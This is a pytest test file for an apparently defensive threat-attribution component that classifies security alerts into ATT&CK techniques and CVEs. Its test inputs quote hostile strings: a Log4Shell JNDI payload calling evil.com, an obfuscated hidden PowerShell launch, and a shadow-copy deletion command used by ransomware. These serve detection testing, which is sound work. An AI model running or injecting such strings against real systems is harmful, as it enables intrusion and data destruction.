"""
Unit tests for AirGappedThreatReasoner.
"""

import pytest
from src.core.threat_reasoner import AirGappedThreatReasoner


@pytest.fixture
def reasoner():
    return AirGappedThreatReasoner()


def test_baseline_reasoning(reasoner):
    query = "Alert: HTTP request with User-Agent containing ${jndi:ldap://evil.com/x} spawned bash"
    res = reasoner.attribute_threat_telemetry(query, mode="baseline")
    assert res["mode"] == "baseline"
    assert res["air_gapped_compliant"] is False
    assert "public threat intelligence multi-scanner" in res["containment_guidance"].lower()


def test_finetuned_log4shell_attribution(reasoner):
    query = "Alert: HTTP request with User-Agent containing ${jndi:ldap://evil.com/x} spawned bash"
    res = reasoner.attribute_threat_telemetry(query, mode="finetuned")
    assert res["mode"] == "finetuned"
    assert res["technique_id"] == "T1190"
    assert "CVE-2021-44228" in res["cve_attribution"]
    assert res["cvss_score"] == 10.0
    assert res["air_gapped_compliant"] is True
    assert "VERIFIED AIR-GAPPED" in res["air_gap_warning"]


def test_finetuned_powershell_attribution(reasoner):
    query = "Suspicious execution: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand"
    res = reasoner.attribute_threat_telemetry(query, mode="finetuned")
    assert res["technique_id"] == "T1059.001"
    assert res["air_gapped_compliant"] is True
    assert "ConstrainedLanguageMode" in res["containment_guidance"]


def test_finetuned_ransomware_attribution(reasoner):
    query = "Mass file rename to .lockbit and vssadmin delete shadows /all /quiet"
    res = reasoner.attribute_threat_telemetry(query, mode="finetuned")
    assert res["technique_id"] == "T1486"
    assert res["air_gapped_compliant"] is True
    assert "immutable" in res["containment_guidance"].lower()


def test_benchmark_evaluation(reasoner):
    eval_res = reasoner.run_benchmark_evaluation()
    assert eval_res["total_benchmark_samples"] == 10
    assert eval_res["baseline_accuracy"] <= 0.60
    assert eval_res["finetuned_accuracy"] >= 0.80
    assert eval_res["accuracy_improvement_pct"] >= 28.0
    assert eval_res["target_benchmark_met"] is True
